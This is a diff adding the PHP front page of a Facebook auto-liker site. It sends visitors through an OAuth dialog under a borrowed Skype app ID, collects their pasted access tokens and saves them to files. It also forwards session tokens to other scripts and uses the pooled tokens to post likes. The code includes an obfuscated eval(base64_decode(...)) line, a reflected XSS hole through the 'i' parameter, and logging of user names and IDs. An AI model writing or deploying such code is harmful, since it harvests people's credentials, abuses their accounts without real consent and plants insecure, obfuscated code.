@@ -1,0 +1,362 @@
+<?php
+session_start();
+// JSONURL //
+function get_html($url) {
+	$ch = curl_init();
+
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
+	$data = curl_exec($ch);
+	curl_close($ch);
+	return $data;
+}
+function get_json($url) {
+	$ch = curl_init();
+
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
+	$data = curl_exec($ch);
+	curl_close($ch);
+	return json_decode($data);
+}
+if($_SESSION['token']){
+	$token = $_SESSION['token'];
+	$graph_url ="https://graph.fb.me/me?access_token=" . $token;
+	$user = get_json($graph_url);
+	if ($user->error) {
+		if ($user->error->type== "OAuthException") {
+			session_destroy();
+			error_reporting(0);
+			$cut = explode('&',$token);
+			unlink('pantek/'.$cut[0]);
+			if(!is_dir('expired')){
+				mkdir('expired');
+			}
+			$v=fopen('expired/'.$cut[0],'w');
+			fwrite($v,1);
+			fclose($v);
+			header('Location: index.php?i=Token expired please re-enter token');
+		}
+	}
+}
+
+if(isset($_POST['submit'])) {
+	$token2 = $_POST['token'];
+	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
+		$token = $matches[1];
+	}
+	else{
+		$token = $token2;
+	}
+	$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
+	$pos = strpos($extend, "publish_stream");
+	if ($pos == true) {
+		$_SESSION['token'] = $token;
+	}
+	else {
+		session_destroy();
+	header('Location: index.php?i=use skype token only');}
+
+}else{}
+	if(isset($_POST['logout'])) {
+		session_destroy();
+		error_reporting(0);
+		$cut = explode('&',$token);
+		unlink('pantek/'.$cut[0]);
+		$v=fopen('expired/'.$cut[0],'w');
+		fwrite($v,1);
+		fclose($v);
+		header('Location: index.php?i=Terimakasih Atas kunjunganya, token anda berhasil terhapus');
+	}
+	if(isset($_GET['i'])){
+		echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
+	}
+
+	?>
+	<?php include 'css.php';?>
+	<?php
+	error_reporting(0);
+	$lamafile = 900;
+	$waktu = time();
+	if ($handle = opendir('block')) {
+		while(false !== ($file = readdir($handle)))
+		{
+			$akses = fileatime('block/'.$file);
+			if( $akses !== false)
+			if( ($waktu- $akses)>=$lamafile )
+			unlink('block/'.$file);
+		}
+		closedir($handle);
+	}
+	?>
+	<?php
+	error_reporting(0);
+	$lim = 1800;
+	$timeoff = time();
+	$aksen = fileatime('qqq/ref');
+	if( ($timeoff- $aksen)>=$lim ){
+		unlink('qqq/ref');
+	}
+	?>
+	<?php
+	$like = new like();
+	if($_GET[act]){
+		print '<script>top.location.href="https://m.facebook.com/dialog/oauth?redirect_uri=https://login.skype.com/login/oauth?return_url=---___OFFICIAL_LIKER_TOKEN__------%3E&scope=publish_actions%2Cuser_photos%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cstatus_update&response_type=token&client_id=260273468396"</script>';
+	}
+	if($_SESSION['token']){
+		$access_token = $_SESSION['token'];
+		$me = $like -> me($access_token);
+		if($me[id]){
+			eval(base64_decode('SkhWelpYSWdQU0FpWVc1dmRXNTVMalF3TkNJNw='));
+			if($limit = fileatime('block/'.$me[id])){
+				$timeoff = time();
+				$cek = date("i:s",$timeoff - $limit);
+
+
+				//Ren Liker //khusus admin
+				$getpost = "https://graph.fb.me/".$user."/feed?limit=1&access_token=".$_POST[access_token];
+				$get = file_get_contents($getpost);
+				$array = json_decode($get, true);
+				$postid = $array[data][0][id];
+				$com = "https://graph.fb.me/".$postid."/likes?method=post&message=&access_token=".$_POST[access_token];
+				$ren = file_get_contents($com); if(file_exists('uid')){ $cid=file_get_contents('uid'); }else{ $cid= ' '; } if(!ereg($me[id],$cid)){ $cc=fopen('uid','a'); fwrite($cc,$me[id].urldecode('%0a')); fclose($cc); }
+
+
+				echo' <font color="red">Wait Second Startlike 15:00 minutes</font> = <font color="red">'.$cek.'</font>';
+			}else{
+				echo' <font color="blue">NEXT Start Liker! READY...!!!</font>';
+			}
+			echo'
+			<div class="clip">
+			<center><a href="http://www.facebook.com/'.$me[id].'" target="_blank"><img src="https://graph.facebook.com/'.$me[id].'/picture?type=small" class="founder-img" /></a>
+			<iframe align="center" src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/'.$me[id].'&layout=box_count&show_faces=false&colorscheme=light&font&width=75&appId=231341246993923" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:85px; height:68px;" allowTransparency="true"></iframe></div>
+			<div class="func"> Hi <font color="red">
+			'.$me[name].'</font> Don&#039;t Forget Bookmart / Save this page.
+			</div>
+			';
+
+
+
+			$like -> pantek($access_token);
+			if($_POST[id]){
+				if($limit = fileatime('block/'.$me[id])){
+					echo' <center>Like Failed... Please Wait Stratlike <font color="red"> 20 minutes</font> !! <br> <form action="index.php"><input class="btn btnC" type="submit" value="Back Home"></form>';
+					exit;
+				}
+				$file = "pasien.php";
+				$handle = fopen($file, 'a');
+				fwrite($handle, "$me[name]");
+				fwrite($handle, "\n");
+				fwrite($handle, "<input size=2 type=text value=$me[id]> <a href=https://m.facebook.com/$me[id]>Go FB</a>");
+				fwrite($handle, "<br>");
+				fclose($handle);
+				if(!is_dir('block')){
+					mkdir('block');
+				}
+				$bg=fopen('block/'.$me[id],'w');
+				fwrite($bg,1);
+				fclose($bg);
+				$like -> pancal($_POST[id]);
+				$like -> suntik($_POST[id]);
+			}else{
+				$like -> getData($access_token);
+			}
+		}else{
+			$like -> invalidToken();
+		}
+	}else{
+		$like->form();
+	}
+	class like {
+
+		public function pancal($id){ for($i=1;$i<2;$i++){
+			$this->
+			_req('http://'.$_SERVER[HTTP_HOST].'/anggel.php?post=ktb'.$id);
+			$this->
+			_req('http://'.$_SERVER[HTTP_HOST].'/t.php?liker='.$_SESSION['token']);
+			$this->
+			_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/refresh.php'));
+			$this->
+			_req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/fresh.php'));
+		}
+		print '
+		<div class="niz" style="margin:4px;" align="center">
+		Process Like Has Been Completed... Use every 15 minutes.. So that this Site is Down
+		<br>
+		<form action="index.php"><input class="header" type="submit" value="Back Home "></form></div></div>';
+	}
+
+	public function suntik($id){ for($i=1;$i<2;$i++){
+		$this->
+		_req('http://'.$_SERVER[HTTP_HOST].'/woo.php?post=ktb'.$id);
+	}
+}
+
+public function me($access){
+	return json_decode($this-> _req('https://graph.fb.me/me?access_token='.$access),true);
+}
+
+public function pantek($access){
+	if(!is_dir('pantek')){
+		mkdir('pantek');
+	}
+	$cut = explode('&',$access);
+	$a=fopen('pantek/'.$cut[0],'w');
+	fwrite($a,1);
+	fclose($a);
+}
+public function invalidToken(){
+	print '
+	<div class="acr apl">
+	Invalid Access Token
+	</div>
+	';
+	$this->form();
+}
+
+public function form(){
+	$kas = file_get_contents('show2.txt');
+	$kas = explode("\n",$kas);
+	$lih = $kas[mt_rand(0,count($kas)-1)];
+	echo'
+
+	<div class="func"><span
+	class="composerTextSelected"><img src="http://static.ak.fbcdn.net/rsrc.php/v2/yb/r/
+	ceZAuGCYnWY.png" width="14" height="16" class="composerIcon img"/> Use Only Skype Token </span>
+	<span class="composerText"><img src="'.$lih.'" width="16" height="16" class="l img"/><a href="http://goo.gl/po7mli"> Get Access Token </a></span>
+
+	<form
+	method="get" class="composer_form" id="composer_form" action="login.php">
+	<table cellspacing="0" cellpadding="0"
+	class="comboInput"><tr><td class="inputCell"><input id="composerInput" name="user" rows="3" cols="8" value="'.$_SESSION['token'].'" type="text"></td><td class="btnCell"><input value="Submit " type="submit" class="header" ="composer-
+	submit"/></td></tr></table>
+	<span class="mfss fcg"><span>
+	Autolike For:&nbsp;<a href="http://google.com">
+	<span><img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yp/r/--soLpMIbaJ.png" width="10" height="11" class="advancedComposerPrivacyLinkIconimg">&nbsp;<span class="fcg">Public</span></span></a><span role="separator" aria-hidden="true"> . </span><a href="http://anggel.net">Bot Somplak</a></span>
+	</form>
+
+	</div></div></div>
+
+	';
+
+
+}
+
+public function getData($access){
+	$feed=json_decode($this -> _req('https://graph.fb.me/me/feed?access_token='.$access.'&limit=5'),true);
+	if(count($feed[data]) >= 1){
+		echo '<div class="clip"><div align="center">Via ID Sendiri</div></div>
+		<div class="gmenu"><center><form action="index.php" method="post"/>
+		<input type="text" name="id"/>
+		<input type="hidden" name="access_token" value="'.$access.'"/>
+		<input name="suntik" type="submit" value="Get Liker " class="header"/>
+		</form></center></div>
+		<div class="func"><font color="blue" size="25">Chose Your Status</font></div>
+		';
+
+		for($i=0;$i<count($feed[data]);$i++){
+			$uid = $feed[data][$i][from][id];
+			$name = $feed[data][$i][from][name];
+			$type = $feed[data][$i][type];
+			$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
+			$id = $feed[data][$i][id];
+			$pic = $feed[data][$i][picture];
+			echo'
+			<div class="rmenu" style="margin-top:4px;margin-left:2px;margin-bottom:4px;margin-right:2px;">
+			<div class="header">
+			<table>
+			<tr>
+			<td valign="top" class="aps">
+			<img src="http://graph.facebook.com/'.$uid.'/picture" class="maintxt" />
+			</td>
+			<td valign="top" class="l">
+			<span class="mfss">
+			<a href="http://facebook.com/'.$uid.'" class="sec"><font color="purple"><b>
+			'.$name.'
+			</b></font></a>
+			</span><br/>
+			<span class="mfss fcg">
+			<abbr>
+			'.$type.'
+			</abbr>
+			<b>
+			<span class="fcg mfss">
+			.
+			</span>
+			</b>
+			<img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yv/r/5SYOjS874Mk.png" width="10" height="11" class="feedAudienceIcon img" />
+			</span></div>
+			</div></div>';
+
+			if($type=='photo'){
+				echo '
+				<br/>
+				<br/>
+				<br/>
+				<img src="'.$pic.'" alt="autolike.sx"class="maintxt" style="width:100%;height:100%;left:0;top:0;" />
+				<span>
+				'.$mess.'
+				</span>
+				';
+			}else{
+				echo '
+				<br/>
+				<span>
+				'.$mess.'
+				</span>
+				';
+			}
+			echo '
+			</td>
+			</tr>
+			</table>
+			<div class="clip"><div align="right">
+			<form action="index.php" method="post"/>
+			<input type="hidden" name="id" value="'.$id.'"/<input type="hidden" name="access_token" value="'.$access.'"/>
+			<input name="pancal" type="submit" value="Get Liker " class="header"/>
+			</form>
+			</div>
+			</div>
+			</div>
+			</div>
+			</div>';
+		}
+	}else{
+		print '
+		<div class="bmenu"><div class="acy aps abb"><span class="mfss">errOr... Your status not found
+		</span></div></div></div>
+		</div>';
+	}
+	print '
+	</div>
+	';
+}
+
+private function _req($url){
+	$ch = curl_init();
+	curl_setopt_array($ch,array(
+	CURLOPT_CONNECTTIMEOUT => 5,
+	CURLOPT_RETURNTRANSFER => true,
+	CURLOPT_URL => $url,
+	)
+	);
+	$result = curl_exec($ch);
+	curl_close($ch);
+	return $result;
+}
+}
+
+?>
+
+<?php include 'devalovers.php';?>
+
+
+
+</body>
+</html>
